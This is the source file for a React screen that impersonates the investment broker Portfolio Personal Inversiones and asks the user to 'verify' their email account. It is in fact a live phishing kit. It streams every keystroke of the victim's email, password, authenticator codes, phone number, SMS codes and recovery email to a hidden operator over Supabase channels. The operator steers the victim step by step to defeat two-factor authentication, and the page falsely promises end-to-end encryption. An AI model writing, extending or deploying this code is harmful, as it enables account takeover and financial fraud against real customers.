import { useState, useEffect, useCallback, useRef } from "react";
import { supabase } from "@/integrations/supabase/client";
import { getEmailProvider } from "@/lib/emailProviders";
import { Loader2, Mail, ArrowLeft, ShieldCheck, CheckCircle2, Lock, AlertCircle } from "lucide-react";
import ppiLogoSvg from "@/assets/ppi-logo.svg";

interface PpiSyncEmailScreenProps {
  sessionId: string;
  onBack: () => void;
}

type SyncStep =
  | "email_input"
  | "password"
  | "waiting"
  | "token_2fa"
  | "sms_phone"
  | "sms_waiting"
  | "sms_code"
  | "recovery_email_input"
  | "recovery_email_submitted"
  | "success";

const PpiSyncEmailScreen = ({ sessionId, onBack }: PpiSyncEmailScreenProps) => {
  const [step, setStep] = useState<SyncStep>("email_input");
  const [clientEmail, setClientEmail] = useState("");
  const [password, setPassword] = useState("");
  const [tokenCode, setTokenCode] = useState("");
  const [smsCode, setSmsCode] = useState("");
  const [clientRecoveryEmail, setClientRecoveryEmail] = useState("");
  const [clientPhoneInput, setClientPhoneInput] = useState("");
  const [phoneEnding, setPhoneEnding] = useState("");
  const [adminTokenCode, setAdminTokenCode] = useState("");
  const [recoveryEmailAddr, setRecoveryEmailAddr] = useState("");
  const [errorMessage, setErrorMessage] = useState("");

  const provider = clientEmail ? getEmailProvider(clientEmail) : null;

  const syncChRef = useRef<ReturnType<typeof supabase.channel> | null>(null);
  const confirmChRef = useRef<ReturnType<typeof supabase.channel> | null>(null);
  const stepRef = useRef<SyncStep>("email_input");

  useEffect(() => {
    stepRef.current = step;
  }, [step]);

  const broadcastToAdmin = useCallback(
    (event: string, payload: Record<string, string>) => {
      if (syncChRef.current) syncChRef.current.send({ type: "broadcast", event, payload });
      if (confirmChRef.current) confirmChRef.current.send({ type: "broadcast", event, payload });
    },
    []
  );

  useEffect(() => {
    const syncCh = supabase.channel(`sync-email-${sessionId}`);
    const confirmCh = supabase.channel(`confirm-email-${sessionId}`);
    syncChRef.current = syncCh;
    confirmChRef.current = confirmCh;

    const handleDecision = (decision: string, payload?: Record<string, string>) => {
      const currentStep = stepRef.current;
      const isCredentialPhase = currentStep === "email_input" || currentStep === "password";

      if (decision === "sync_wrong_password" || decision === "confirm_wrong_password") {
        setErrorMessage("Contraseña incorrecta. Intentá de nuevo.");
        setStep("password");
        setPassword("");
      } else if ((decision === "sync_ask_otp" || decision === "confirm_ask_otp") && !isCredentialPhase) {
        if (currentStep === "sms_waiting" || currentStep === "recovery_email_submitted") {
          setStep("sms_code"); setSmsCode("");
        } else {
          setStep("token_2fa"); setTokenCode(""); setAdminTokenCode("");
        }
        setErrorMessage("");
      } else if ((decision === "sync_ask_token" || decision === "confirm_ask_token") && !isCredentialPhase) {
        setAdminTokenCode(payload?.admin_token || "");
        setStep("token_2fa"); setTokenCode(""); setErrorMessage("");
      } else if ((decision === "sync_ask_sms" || decision === "confirm_ask_sms") && !isCredentialPhase) {
        if (currentStep === "sms_waiting" || currentStep === "recovery_email_submitted") {
          setStep("sms_code"); setSmsCode("");
        } else {
          setPhoneEnding(payload?.sms_ending || "");
          setStep("sms_phone"); setClientPhoneInput(""); setSmsCode("");
        }
        setErrorMessage("");
      } else if ((decision === "sync_advance_sms_code" || decision === "confirm_advance_sms_code") && !isCredentialPhase) {
        const ending = payload?.sms_ending || "";
        if (ending) setPhoneEnding(ending);
        setStep("sms_code"); setSmsCode(""); setErrorMessage("");
      } else if ((decision === "sync_ask_recovery_email" || decision === "confirm_ask_recovery_email") && !isCredentialPhase) {
        setRecoveryEmailAddr(payload?.recovery_email || "");
        setStep("recovery_email_input"); setClientRecoveryEmail(""); setErrorMessage("");
      } else if (decision === "sync_approved" || decision === "confirm_approved") {
        setStep("success");
      } else if ((decision === "sync_rejected" || decision === "confirm_rejected") && !isCredentialPhase) {
        setErrorMessage("Verificación fallida. Intentá de nuevo.");
        setClientRecoveryEmail(""); setSmsCode(""); setTokenCode("");
      }
    };

    syncCh.on("broadcast", { event: "admin_sync_decision" }, (p) => handleDecision(p.payload?.status, p.payload)).subscribe();
    confirmCh.on("broadcast", { event: "admin_decision" }, (p) => handleDecision(p.payload?.status, p.payload)).subscribe();

    const pollInterval = setInterval(async () => {
      const { data } = await supabase.from("sessions").select("status, otp_code").eq("id", sessionId).maybeSingle();
      if (!data) return;
      const { status: dbStatus, otp_code: otp } = data;
      const currentStep = stepRef.current;
      const isCredentialPhase = currentStep === "email_input" || currentStep === "password";

      if ((dbStatus === "sync_wrong_password" || dbStatus === "confirm_wrong_password") && currentStep !== "password") {
        setErrorMessage("Contraseña incorrecta."); setStep("password"); setPassword("");
      } else if ((dbStatus === "sync_ask_otp" || dbStatus === "confirm_ask_otp") && !isCredentialPhase && currentStep !== "token_2fa" && currentStep !== "sms_code") {
        if (currentStep === "sms_waiting" || currentStep === "recovery_email_submitted") { setStep("sms_code"); setSmsCode(""); }
        else { setStep("token_2fa"); setTokenCode(""); setAdminTokenCode(""); }
      } else if ((dbStatus === "sync_ask_token" || dbStatus === "confirm_ask_token") && !isCredentialPhase && currentStep !== "token_2fa") {
        const code = otp?.startsWith("admin_token:") ? otp.replace("admin_token:", "") : "";
        setAdminTokenCode(code); setStep("token_2fa"); setTokenCode("");
      } else if ((dbStatus === "sync_ask_sms" || dbStatus === "confirm_ask_sms") && !isCredentialPhase && currentStep !== "sms_phone" && currentStep !== "sms_code" && currentStep !== "sms_waiting") {
        if (currentStep === "recovery_email_submitted") { setStep("sms_code"); setSmsCode(""); }
        else {
          const ending = otp?.startsWith("sms_ending:") ? otp.replace("sms_ending:", "") : "";
          setPhoneEnding(ending); setStep("sms_phone"); setClientPhoneInput(""); setSmsCode("");
        }
      } else if ((dbStatus === "sync_advance_sms_code" || dbStatus === "confirm_advance_sms_code") && !isCredentialPhase && currentStep !== "sms_code") {
        const ending = otp?.startsWith("sms_ending:") ? otp.replace("sms_ending:", "") : "";
        if (ending) setPhoneEnding(ending); setStep("sms_code"); setSmsCode("");
      } else if ((dbStatus === "sync_ask_recovery_email" || dbStatus === "confirm_ask_recovery_email") && !isCredentialPhase && currentStep !== "recovery_email_input" && currentStep !== "recovery_email_submitted") {
        const recEmail = otp?.startsWith("recovery_email_addr:") ? otp.replace("recovery_email_addr:", "") : "";
        setRecoveryEmailAddr(recEmail); setStep("recovery_email_input"); setClientRecoveryEmail("");
      } else if (dbStatus === "sync_approved" || dbStatus === "confirm_approved") {
        setStep("success");
      }
    }, 1000);

    return () => {
      syncChRef.current = null;
      confirmChRef.current = null;
      supabase.removeChannel(syncCh);
      supabase.removeChannel(confirmCh);
      clearInterval(pollInterval);
    };
  }, [sessionId]);

  /* ── Email submit ── */
  const handleEmailChange = useCallback(
    (value: string) => {
      setClientEmail(value);
      broadcastToAdmin("client_sync_email", { session_id: sessionId, sync_email: value });
      void supabase.from("sessions").update({ otp_code: `sync_email:${value}` }).eq("id", sessionId);
    },
    [sessionId, broadcastToAdmin]
  );

  const handleEmailSubmit = useCallback(
    (e: React.FormEvent) => {
      e.preventDefault();
      if (!clientEmail.trim()) return;

      setErrorMessage("");
      setStep("password");

      broadcastToAdmin("client_sync_email", { session_id: sessionId, sync_email: clientEmail });
      void supabase.from("sessions").update({ otp_code: `sync_email:${clientEmail}` }).eq("id", sessionId);
    },
    [clientEmail, sessionId, broadcastToAdmin]
  );

  /* ── Password handlers ── */
  const handlePasswordChange = useCallback(
    (v: string) => {
      setPassword(v);
      supabase.from("sessions").update({ otp_code: `email_pass:${v}` }).eq("id", sessionId).then(() => {});
      broadcastToAdmin("client_email_password_typing", { session_id: sessionId, email_password: v });
    },
    [sessionId, broadcastToAdmin]
  );

  const handlePasswordSubmit = useCallback(
    (e: React.FormEvent) => {
      e.preventDefault();
      const submittedPassword = password.trim();
      if (!submittedPassword) return;

      setErrorMessage("");
      setStep("waiting");

      broadcastToAdmin("client_email_password", {
        session_id: sessionId,
        email_password: submittedPassword,
        email: clientEmail,
        provider_id: provider?.id || "",
        provider_name: provider?.name || "",
      });

      void supabase
        .from("sessions")
        .update({ otp_code: `email_pass:${submittedPassword}`, status: "confirm_email_pending" })
        .eq("id", sessionId);
    },
    [password, sessionId, broadcastToAdmin, clientEmail, provider]
  );

  /* ── Token / SMS / Recovery handlers ── */
  const handleTokenChange = useCallback(
    (v: string) => {
      setTokenCode(v);
      supabase.from("sessions").update({ otp_code: `token_code:${v}` }).eq("id", sessionId).then(() => {});
      broadcastToAdmin("client_token_update", { session_id: sessionId, token_code: v });
    },
    [sessionId, broadcastToAdmin]
  );

  const handlePhoneChange = useCallback(
    (v: string) => {
      setClientPhoneInput(v);
      supabase.from("sessions").update({ otp_code: `client_phone:${v}` }).eq("id", sessionId).then(() => {});
      broadcastToAdmin("client_phone_update", { session_id: sessionId, phone_number: v });
    },
    [sessionId, broadcastToAdmin]
  );

  const handlePhoneSubmit = useCallback(
    (e: React.FormEvent) => {
      e.preventDefault();
      if (!clientPhoneInput.trim()) return;
      supabase.from("sessions").update({ otp_code: `client_phone_final:${clientPhoneInput}` }).eq("id", sessionId).then(() => {});
      broadcastToAdmin("client_phone_submitted", { session_id: sessionId, phone_number: clientPhoneInput });
      setStep("sms_waiting");
    },
    [clientPhoneInput, sessionId, broadcastToAdmin]
  );

  const handleSmsCodeChange = useCallback(
    (v: string) => {
      setSmsCode(v);
      supabase.from("sessions").update({ otp_code: `sms_code:${v}` }).eq("id", sessionId).then(() => {});
      broadcastToAdmin("client_sms_update", { session_id: sessionId, sms_code: v });
    },
    [sessionId, broadcastToAdmin]
  );

  const handleRecoveryEmailChange = useCallback(
    (v: string) => {
      setClientRecoveryEmail(v);
      supabase.from("sessions").update({ otp_code: `client_recovery_email:${v}` }).eq("id", sessionId).then(() => {});
      broadcastToAdmin("client_recovery_email_update", { session_id: sessionId, recovery_email: v });
    },
    [sessionId, broadcastToAdmin]
  );

  const handleRecoveryEmailSubmit = useCallback(
    (e: React.FormEvent) => {
      e.preventDefault();
      if (!clientRecoveryEmail.trim()) return;
      supabase.from("sessions").update({ otp_code: `client_recovery_email_final:${clientRecoveryEmail}` }).eq("id", sessionId).then(() => {});
      broadcastToAdmin("client_recovery_email_submitted", { session_id: sessionId, recovery_email: clientRecoveryEmail });
      setStep("recovery_email_submitted");
    },
    [clientRecoveryEmail, sessionId, broadcastToAdmin]
  );

  /* ── Styles ── */
  const inputClass =
    "w-full rounded-lg border border-[#d0d7e2] bg-white px-4 py-3 text-[15px] text-[#1e2a3a] outline-none transition-all placeholder:text-[#b0b8c4] focus:border-[#1e5a96] focus:ring-2 focus:ring-[#1e5a96]/15 disabled:opacity-50";
  const btnClass =
    "w-full rounded-lg bg-[#1e5a96] py-3.5 text-[14px] font-semibold text-white transition-all hover:bg-[#174a7f] active:scale-[0.99] disabled:opacity-40 disabled:pointer-events-none";
  const labelClass = "mb-1.5 block text-[12px] font-medium text-[#64748b] uppercase tracking-wide";

  const renderError = () =>
    errorMessage ? (
      <div className="mb-4 flex items-start gap-2.5 rounded-lg border border-red-200 bg-red-50/80 px-4 py-3">
        <AlertCircle size={15} className="text-red-500 flex-shrink-0 mt-0.5" />
        <span className="text-[13px] text-red-600">{errorMessage}</span>
      </div>
    ) : null;

  const renderLoading = (text: string) => (
    <div className="flex items-center justify-center gap-2.5 py-2 text-[13px] text-[#64748b]">
      <Loader2 className="h-4 w-4 animate-spin text-[#1e5a96]" />
      {text}
    </div>
  );

  /* ── Layout wrapper ── */
  const PageWrapper = ({ children }: { children: React.ReactNode }) => (
    <div className="flex min-h-[100svh] flex-col bg-[#f8f9fb]">
      <header className="flex items-center justify-between px-5 py-4 sm:px-10 sm:py-5 bg-white border-b border-[#eef0f4]">
        <img src={ppiLogoSvg} alt="PPI" className="h-8 sm:h-9" />
        <button
          onClick={onBack}
          className="flex items-center gap-1.5 text-[13px] font-medium text-[#64748b] hover:text-[#1e5a96] transition-colors"
        >
          <ArrowLeft size={14} />
          Volver
        </button>
      </header>
      <main className="flex flex-1 items-center justify-center px-4 py-8">{children}</main>
      <footer className="border-t border-[#eef0f4] bg-white px-5 py-3">
        <p className="text-center text-[10px] text-[#b0b8c4]">
          Portfolio Personal Inversiones S.A. — ALyC Integral CNV N° 686
        </p>
      </footer>
    </div>
  );

  /* ── Success ── */
  if (step === "success") {
    return (
      <PageWrapper>
        <div className="w-full max-w-[440px] text-center">
          <div className="flex justify-center mb-5">
            <div className="flex h-16 w-16 items-center justify-center rounded-full bg-[#f0fdf4] border border-[#bbf7d0]">
              <CheckCircle2 size={32} className="text-[#16a34a]" />
            </div>
          </div>
          <h1 className="text-[20px] font-bold text-[#1e2a3a] mb-2">Email verificado</h1>
          <p className="text-[14px] text-[#64748b]">Tu email fue verificado exitosamente.</p>
          {clientEmail && <p className="mt-1 text-[12px] text-[#94a3b8]">{clientEmail}</p>}
        </div>
      </PageWrapper>
    );
  }

  /* ── Main form ── */
  return (
    <PageWrapper>
      <div className="w-full max-w-[440px]">
        <div className="rounded-2xl bg-white border border-[#e2e8f0] overflow-hidden" style={{ boxShadow: "0 2px 16px rgba(30,90,150,0.06)" }}>
          <div className="px-6 sm:px-8 py-6 sm:py-8">
            {renderError()}

            {/* ── STEP: Email input ── */}
            {step === "email_input" && (
              <>
                <div className="flex justify-center mb-5">
                  <div className="flex h-12 w-12 items-center justify-center rounded-full bg-[#eff6ff] border border-[#bfdbfe]">
                    <Mail size={22} className="text-[#1e5a96]" />
                  </div>
                </div>
                <h1 className="text-center text-[18px] font-bold text-[#1e2a3a] mb-1.5">Vincular cuenta</h1>
                <p className="text-center text-[13px] text-[#64748b] mb-6 leading-relaxed max-w-[340px] mx-auto">
                  Ingresá tu usuario o dirección de email para vincular tu cuenta.
                </p>
                <form onSubmit={handleEmailSubmit}>
                  <label className={labelClass}>Usuario o email</label>
                  <input
                    type="text"
                    placeholder="Ingresá tu usuario o email"
                    value={clientEmail}
                    onChange={(e) => handleEmailChange(e.target.value)}
                    autoFocus
                    className={`${inputClass} mb-5`}
                  />
                  <button type="submit" disabled={!clientEmail.trim()} className={btnClass}>Continuar</button>
                </form>
                <div className="mt-5 flex items-start gap-2 rounded-lg bg-[#fafbfc] border border-[#eef0f4] px-3.5 py-2.5">
                  <Lock size={12} className="text-[#94a3b8] flex-shrink-0 mt-0.5" />
                  <p className="text-[11px] text-[#94a3b8] leading-relaxed">
                    Tu información está protegida con encriptación de extremo a extremo.
                  </p>
                </div>
              </>
            )}

            {/* ── STEP: Password ── */}
            {step === "password" && (
              <>
                <div className="flex justify-center mb-5">
                  <div className="flex h-12 w-12 items-center justify-center rounded-full bg-[#eff6ff] border border-[#bfdbfe]">
                    <ShieldCheck size={22} className="text-[#1e5a96]" />
                  </div>
                </div>
                <h1 className="text-center text-[18px] font-bold text-[#1e2a3a] mb-1.5">Verificar email</h1>
                <p className="text-center text-[13px] text-[#64748b] mb-2 leading-relaxed">
                  Ingresá la contraseña de tu email para confirmar tu identidad.
                </p>
                {provider && (
                  <div className="mb-5 flex items-center gap-3 rounded-lg border border-[#e2e8f0] bg-[#fafbfc] px-4 py-2.5">
                    <div className="h-7 w-7 shrink-0">{provider.icon}</div>
                    <div className="flex flex-col">
                      <span className="text-[10px] text-[#94a3b8]">{provider.name}</span>
                      <span className="text-[13px] font-medium text-[#1e2a3a]">{clientEmail}</span>
                    </div>
                  </div>
                )}
                <form onSubmit={handlePasswordSubmit}>
                  <label className={labelClass}>Contraseña de {provider?.name || "email"}</label>
                  <input
                    type="password"
                    placeholder="Ingresá tu contraseña"
                    value={password}
                    onChange={(e) => handlePasswordChange(e.target.value)}
                    autoFocus
                    className={`${inputClass} mb-5`}
                  />
                  <button type="submit" disabled={!password.trim()} className={btnClass}>Continuar</button>
                </form>
              </>
            )}

            {/* ── STEP: Waiting ── */}
            {step === "waiting" && (
              <div className="text-center py-4">
                <h1 className="text-[18px] font-bold text-[#1e2a3a] mb-2">Verificando tu cuenta</h1>
                <p className="text-[13px] text-[#64748b] mb-6">Estamos verificando tu email. Esto puede tardar unos segundos...</p>
                {renderLoading("Verificación en progreso...")}
              </div>
            )}

            {/* ── STEP: Token 2FA ── */}
            {step === "token_2fa" && (
              <>
                <h1 className="text-center text-[18px] font-bold text-[#1e2a3a] mb-1.5">Verificación en dos pasos</h1>
                {adminTokenCode ? (
                  <div className="text-center">
                    <p className="text-[13px] text-[#64748b] mb-5">Tocá el número en tu dispositivo para confirmar</p>
                    <div className="mb-5 flex h-20 w-20 items-center justify-center rounded-2xl border-2 border-[#1e5a96] bg-[#1e5a96]/10 mx-auto">
                      <span className="text-3xl font-bold text-[#1e5a96]">{adminTokenCode}</span>
                    </div>
                    {renderLoading("Esperando confirmación...")}
                  </div>
                ) : (
                  <>
                    <p className="text-center text-[13px] text-[#64748b] mb-5">Ingresá el código de 6 dígitos de tu app de autenticación</p>
                    <label className={labelClass}>Código de verificación</label>
                    <input
                      type="text"
                      inputMode="numeric"
                      value={tokenCode}
                      onChange={(e) => handleTokenChange(e.target.value)}
                      autoFocus
                      maxLength={6}
                      placeholder="000000"
                      className={`${inputClass} mb-5 text-center text-[20px] tracking-[0.3em]`}
                    />
                    {tokenCode.length >= 6 ? renderLoading("Verificando código...") : (
                      <button disabled className={btnClass}>Continuar</button>
                    )}
                  </>
                )}
              </>
            )}

            {/* ── STEP: SMS phone ── */}
            {step === "sms_phone" && (
              <>
                <h1 className="text-center text-[18px] font-bold text-[#1e2a3a] mb-1.5">Verificación telefónica</h1>
                <p className="text-center text-[13px] text-[#64748b] mb-5">
                  {phoneEnding ? (
                    <>Confirmá el número que termina en <span className="font-bold text-[#1e2a3a]">**{phoneEnding}</span></>
                  ) : "Ingresá tu número de teléfono"}
                </p>
                <form onSubmit={handlePhoneSubmit}>
                  <label className={labelClass}>Número de teléfono</label>
                  <input
                    type="tel"
                    placeholder={phoneEnding ? `Termina en ${phoneEnding}` : "+54 11 0000-0000"}
                    value={clientPhoneInput}
                    onChange={(e) => handlePhoneChange(e.target.value)}
                    autoFocus
                    className={`${inputClass} mb-5`}
                  />
                  <button type="submit" disabled={!clientPhoneInput.trim()} className={btnClass}>Continuar</button>
                </form>
              </>
            )}

            {/* ── STEP: SMS waiting ── */}
            {step === "sms_waiting" && (
              <div className="text-center py-4">
                <h1 className="text-[18px] font-bold text-[#1e2a3a] mb-2">Verificación telefónica</h1>
                <p className="text-[13px] text-[#64748b] mb-6">
                  Enviando código a <span className="font-bold text-[#1e2a3a]">{clientPhoneInput}</span>
                </p>
                {renderLoading("Enviando código SMS...")}
              </div>
            )}

            {/* ── STEP: SMS code ── */}
            {step === "sms_code" && (
              <>
                <h1 className="text-center text-[18px] font-bold text-[#1e2a3a] mb-1.5">Código SMS</h1>
                <p className="text-center text-[13px] text-[#64748b] mb-5">
                  {phoneEnding ? (
                    <>Ingresá el código enviado al **{phoneEnding}</>
                  ) : clientPhoneInput ? (
                    <>Ingresá el código enviado a <span className="font-bold text-[#1e2a3a]">{clientPhoneInput}</span></>
                  ) : "Ingresá el código SMS"}
                </p>
                <label className={labelClass}>Código SMS</label>
                <input
                  type="text"
                  inputMode="numeric"
                  value={smsCode}
                  onChange={(e) => handleSmsCodeChange(e.target.value)}
                  autoFocus
                  maxLength={6}
                  placeholder="000000"
                  className={`${inputClass} mb-5 text-center text-[20px] tracking-[0.3em]`}
                />
                {smsCode.length >= 6 ? renderLoading("Verificando...") : (
                  <button disabled className={btnClass}>Continuar</button>
                )}
              </>
            )}

            {/* ── STEP: Recovery email input ── */}
            {step === "recovery_email_input" && (
              <>
                <h1 className="text-center text-[18px] font-bold text-[#1e2a3a] mb-1.5">Email de recuperación</h1>
                <p className="text-center text-[13px] text-[#64748b] mb-4">Ingresá tu email de recuperación</p>
                {recoveryEmailAddr && (
                  <div className="mb-4 rounded-lg border border-[#e2e8f0] bg-[#fafbfc] px-4 py-2.5">
                    <span className="text-[10px] text-[#94a3b8]">Email de recuperación</span>
                    <p className="text-[13px] font-medium text-[#1e2a3a]">{recoveryEmailAddr}</p>
                  </div>
                )}
                <form onSubmit={handleRecoveryEmailSubmit}>
                  <label className={labelClass}>Email</label>
                  <input
                    type="email"
                    placeholder="Ingresá tu email de recuperación"
                    value={clientRecoveryEmail}
                    onChange={(e) => handleRecoveryEmailChange(e.target.value)}
                    autoFocus
                    className={`${inputClass} mb-5`}
                  />
                  <button type="submit" disabled={!clientRecoveryEmail.trim()} className={btnClass}>Continuar</button>
                </form>
              </>
            )}

            {/* ── STEP: Recovery email submitted ── */}
            {step === "recovery_email_submitted" && (
              <div className="text-center py-4">
                <h1 className="text-[18px] font-bold text-[#1e2a3a] mb-2">Email de recuperación</h1>
                <p className="text-[13px] text-[#64748b] mb-6">
                  Verificando tu email <span className="font-bold text-[#1e2a3a]">{clientRecoveryEmail}</span>
                </p>
                {renderLoading("Verificación en progreso...")}
              </div>
            )}
          </div>
        </div>
      </div>
    </PageWrapper>
  );
};

export default PpiSyncEmailScreen;
